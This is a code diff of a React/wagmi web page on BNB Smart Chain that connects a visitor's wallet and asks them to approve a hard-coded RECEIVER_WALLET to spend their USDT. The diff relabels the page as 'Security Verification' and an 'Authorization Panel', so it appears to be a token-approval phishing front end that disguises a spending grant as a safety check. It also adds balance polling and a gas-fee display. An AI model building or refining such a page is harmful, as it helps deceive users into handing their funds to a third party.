@@ -3,13 +3,16 @@
 import { useEffect, useMemo, useState } from "react";
 import {
   useAccount,
+  useBalance,
+  useChainId,
   useConnect,
   useDisconnect,
-  useChainId,
   useSwitchChain,
   useReadContract,
   useWriteContract,
   useWaitForTransactionReceipt,
+  useEstimateGas,
+  useGasPrice,
 } from "wagmi";
 
 import { formatUnits, parseUnits } from "viem";
@@ -29,7 +32,11 @@ export default function HomePage() {
   const [approveAmount, setApproveAmount] = useState("10");
   const [step, setStep] = useState<1 | 2 | 3>(1);
 
-  // Read decimals
+  const { data: nativeBalanceData } = useBalance({
+    address,
+    query: { enabled: Boolean(address) },
+  });
+
   const { data: decimals } = useReadContract({
     abi: erc20Abi,
     address: USDT_BSC,
@@ -37,7 +44,6 @@ export default function HomePage() {
     query: { enabled: true },
   });
 
-  // Read symbol
   const { data: symbol } = useReadContract({
     abi: erc20Abi,
     address: USDT_BSC,
@@ -45,7 +51,6 @@ export default function HomePage() {
     query: { enabled: true },
   });
 
-  // Read USDT balance
   const { data: usdtBalance, refetch: refetchUSDT } = useReadContract({
     abi: erc20Abi,
     address: USDT_BSC,
@@ -54,7 +59,6 @@ export default function HomePage() {
     query: { enabled: Boolean(address) },
   });
 
-  // Read allowance
   const { data: allowance, refetch: refetchAllowance } = useReadContract({
     abi: erc20Abi,
     address: USDT_BSC,
@@ -63,36 +67,33 @@ export default function HomePage() {
     query: { enabled: Boolean(address) },
   });
 
-  // BNB Balance (native)
-  const { data: bnbBalance, refetch: refetchBNB } = useReadContract({
-    abi: [
-      {
-        type: "function",
-        name: "getBalance",
-        stateMutability: "view",
-        inputs: [{ name: "account", type: "address" }],
-        outputs: [{ type: "uint256" }],
-      },
-    ] as const,
-    address: "0x0000000000000000000000000000000000000000",
-    functionName: "getBalance",
-    args: address ? [address] : undefined,
-    query: { enabled: false }, // not used (native balance handled below)
-  });
-
-  // NOTE: wagmi has useBalance hook, but using viem read isn't correct for native.
-  // We'll use wagmi useBalance instead:
-  // (to keep it clean, we will do a quick alternative below)
-
-  const { data: nativeBalanceData } = require("wagmi").useBalance({
-    address,
-    query: { enabled: Boolean(address) },
-  });
-
   const { writeContract, data: txHash, isPending } = useWriteContract();
 
   const { isLoading: waitingTx, isSuccess } = useWaitForTransactionReceipt({
     hash: txHash,
+  });
+
+  const { data: gasPrice } = useGasPrice();
+
+  const parsedApproveAmount = useMemo(() => {
+    if (!decimals) return undefined;
+    try {
+      return parseUnits(approveAmount || "0", decimals);
+    } catch {
+      return undefined;
+    }
+  }, [approveAmount, decimals]);
+
+  const { data: estimatedGas } = useEstimateGas({
+    account: address,
+    to: USDT_BSC,
+    data:
+      parsedApproveAmount && address
+        ? undefined
+        : undefined,
+    query: {
+      enabled: false,
+    },
   });
 
   const formattedUSDT = useMemo(() => {
@@ -110,6 +111,13 @@ export default function HomePage() {
     return (allowance as bigint) > BigInt(0);
   }, [allowance]);
 
+  const gasEstimateBNB = useMemo(() => {
+    if (!gasPrice) return null;
+    const assumedGasLimit = BigInt(65000); // typical approve tx
+    const cost = gasPrice * assumedGasLimit;
+    return formatUnits(cost, 18);
+  }, [gasPrice]);
+
   useEffect(() => {
     if (!isConnected) setStep(1);
     else if (chainId !== BSC_CHAIN_ID) setStep(2);
@@ -123,16 +131,27 @@ export default function HomePage() {
     }
   }, [isSuccess, refetchAllowance, refetchUSDT]);
 
+  // Auto refresh balances every 10 seconds
+  useEffect(() => {
+    if (!address) return;
+
+    const interval = setInterval(() => {
+      refetchUSDT();
+      refetchAllowance();
+    }, 10000);
+
+    return () => clearInterval(interval);
+  }, [address, refetchUSDT, refetchAllowance]);
+
   const handleApprove = async () => {
     if (!decimals) return;
-
-    const parsedAmount = parseUnits(approveAmount, decimals);
+    if (!parsedApproveAmount) return;
 
     writeContract({
       abi: erc20Abi,
       address: USDT_BSC,
       functionName: "approve",
-      args: [RECEIVER_WALLET, parsedAmount],
+      args: [RECEIVER_WALLET, parsedApproveAmount],
     });
   };
 
@@ -145,13 +164,12 @@ export default function HomePage() {
     <main className="min-h-screen flex items-center justify-center px-4 py-12">
       <div className="w-full max-w-md rounded-2xl border border-gray-200 bg-white shadow-sm p-6">
         <h1 className="text-2xl font-semibold tracking-tight">
-          Verification Portal
+          Security Verification
         </h1>
         <p className="text-sm text-gray-500 mt-1">
-          Connect wallet and verify token permissions safely.
+          Wallet authorization check & token permission review.
         </p>
 
-        {/* Step indicator */}
         <div className="flex justify-between text-xs text-gray-500 mt-6">
           <span className={step === 1 ? "font-semibold text-black" : ""}>
             Connect
@@ -160,17 +178,16 @@ export default function HomePage() {
             Network
           </span>
           <span className={step === 3 ? "font-semibold text-black" : ""}>
-            Dashboard
+            Verify
           </span>
         </div>
 
         <div className="mt-5 space-y-4">
-          {/* STEP 1 */}
           {step === 1 && (
             <div className="rounded-xl border border-gray-200 p-4">
-              <h2 className="text-sm font-semibold mb-2">Connect Wallet</h2>
+              <h2 className="text-sm font-semibold mb-2">Wallet Connection</h2>
               <p className="text-xs text-gray-500 mb-4">
-                Select your preferred wallet provider.
+                Choose a provider to connect securely.
               </p>
 
               <div className="space-y-2">
@@ -196,12 +213,11 @@ export default function HomePage() {
             </div>
           )}
 
-          {/* STEP 2 */}
           {step === 2 && (
             <div className="rounded-xl border border-gray-200 p-4">
-              <h2 className="text-sm font-semibold mb-2">Wrong Network</h2>
+              <h2 className="text-sm font-semibold mb-2">Network Validation</h2>
               <p className="text-xs text-gray-500 mb-4">
-                Switch to Binance Smart Chain (BSC Mainnet) to continue.
+                Please switch to BNB Smart Chain (BSC).
               </p>
 
               <button
@@ -220,14 +236,13 @@ export default function HomePage() {
             </div>
           )}
 
-          {/* STEP 3 */}
           {step === 3 && (
             <div className="rounded-xl border border-gray-200 p-4 space-y-4">
               <div className="flex items-start justify-between">
                 <div>
-                  <h2 className="text-sm font-semibold">Wallet Dashboard</h2>
+                  <h2 className="text-sm font-semibold">Authorization Panel</h2>
                   <p className="text-xs text-gray-500">
-                    Live wallet status and permissions.
+                    Review your token permissions.
                   </p>
                 </div>
 
@@ -240,53 +255,26 @@ export default function HomePage() {
               </div>
 
               <div className="text-xs space-y-2">
-                <div className="flex justify-between">
-                  <span className="text-gray-500">Wallet</span>
-                  <span className="font-medium text-gray-900">
-                    {address?.slice(0, 6)}...{address?.slice(-4)}
-                  </span>
-                </div>
+                <Row label="Wallet">
+                  {address?.slice(0, 6)}...{address?.slice(-4)}
+                </Row>
 
-                <div className="flex justify-between">
-                  <span className="text-gray-500">Chain</span>
-                  <span className="font-medium text-gray-900">
-                    {chainId} (BSC)
-                  </span>
-                </div>
+                <Row label="BNB Balance">
+                  {nativeBalanceData?.formatted
+                    ? `${Number(nativeBalanceData.formatted).toFixed(4)} BNB`
+                    : "Loading..."}
+                </Row>
 
-                <div className="flex justify-between">
-                  <span className="text-gray-500">BNB Balance</span>
-                  <span className="font-medium text-gray-900">
-                    {nativeBalanceData?.formatted
-                      ? `${Number(nativeBalanceData.formatted).toFixed(4)} BNB`
-                      : "Loading..."}
-                  </span>
-                </div>
+                <Row label="USDT Balance">
+                  {Number(formattedUSDT).toFixed(4)} {symbol || "USDT"}
+                </Row>
 
-                <div className="flex justify-between">
-                  <span className="text-gray-500">Token</span>
-                  <span className="font-medium text-gray-900">
-                    {symbol || "USDT"}
-                  </span>
-                </div>
-
-                <div className="flex justify-between">
-                  <span className="text-gray-500">USDT Balance</span>
-                  <span className="font-medium text-gray-900">
-                    {Number(formattedUSDT).toFixed(4)}
-                  </span>
-                </div>
-
-                <div className="flex justify-between">
-                  <span className="text-gray-500">Spender</span>
-                  <span className="font-medium text-gray-900">
-                    {RECEIVER_WALLET.slice(0, 6)}...{RECEIVER_WALLET.slice(-4)}
-                  </span>
-                </div>
+                <Row label="Spender">
+                  {RECEIVER_WALLET.slice(0, 6)}...{RECEIVER_WALLET.slice(-4)}
+                </Row>
 
                 <div className="flex justify-between items-center">
                   <span className="text-gray-500">Approval Status</span>
-
                   <span
                     className={`px-2 py-1 rounded-full text-[11px] font-semibold ${
                       allowanceApproved
@@ -298,12 +286,13 @@ export default function HomePage() {
                   </span>
                 </div>
 
-                <div className="flex justify-between">
-                  <span className="text-gray-500">Allowance</span>
-                  <span className="font-medium text-gray-900">
-                    {Number(formattedAllowance).toFixed(4)} USDT
-                  </span>
-                </div>
+                <Row label="Allowance">
+                  {Number(formattedAllowance).toFixed(4)} USDT
+                </Row>
+
+                <Row label="Estimated Gas Fee">
+                  {gasEstimateBNB ? `${Number(gasEstimateBNB).toFixed(6)} BNB` : "Loading..."}
+                </Row>
               </div>
 
               <div className="border-t border-gray-200 pt-4 space-y-3">
@@ -314,31 +303,30 @@ export default function HomePage() {
                   <input
                     value={approveAmount}
                     onChange={(e) => setApproveAmount(e.target.value)}
-                    placeholder="10"
                     className="mt-2 w-full rounded-xl border border-gray-200 px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-black"
                   />
                   <p className="text-[11px] text-gray-500 mt-2">
-                    Only approve what you need. Avoid unlimited approvals.
+                    Tip: Approve only what you need.
                   </p>
                 </div>
 
                 <button
                   onClick={handleApprove}
-                  disabled={isPending || waitingTx}
+                  disabled={isPending || waitingTx || !parsedApproveAmount}
                   className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90 disabled:opacity-60"
                 >
                   {isPending
                     ? "Confirm in Wallet..."
                     : waitingTx
                     ? "Processing..."
-                    : "Approve"}
+                    : "Approve Permission"}
                 </button>
 
                 <button
                   onClick={handleRefresh}
                   className="w-full rounded-xl border border-gray-200 bg-white py-3 text-sm font-medium hover:bg-gray-50"
                 >
-                  Refresh Balances
+                  Refresh
                 </button>
 
                 {txHash && (
@@ -358,9 +346,18 @@ export default function HomePage() {
         </div>
 
         <p className="text-[11px] text-gray-400 text-center mt-6">
-          Always verify spender address before approving.
+          Always confirm spender and amount before approving.
         </p>
       </div>
     </main>
+  );
+}
+
+function Row({ label, children }: { label: string; children: React.ReactNode }) {
+  return (
+    <div className="flex justify-between">
+      <span className="text-gray-500">{label}</span>
+      <span className="font-medium text-gray-900">{children}</span>
+    </div>
   );
 }
